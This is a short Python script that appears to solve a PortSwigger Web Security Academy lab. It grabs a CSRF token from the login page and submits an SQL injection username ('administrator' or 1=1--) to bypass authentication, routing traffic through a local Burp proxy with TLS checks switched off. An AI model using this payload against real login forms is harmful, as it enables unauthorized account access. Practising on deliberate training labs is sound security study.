import requests 
import urllib3
import re

# Suppress the warning about unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy configuration (usually for tools like Burp Suite, Fiddler, etc.)
proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

url = "https://0a5c00d404a08648805817d900ca0074.web-security-academy.net/"

session = requests.Session()



csrf_token = session.get(url+"login",proxies=proxies,verify=False)
match = re.search(r'name="csrf".*?value="(.*?)"', csrf_token.text)
a=match.group(1)

data = {"csrf":a,"username":"administrator ' or 1=1--","password":"pass"}
response = session.post(url+"login",verify=False,data=data,proxies=proxies)

#html = '<input type="hidden" name="csrf" value="abc123">'
# Very simple and universal pattern
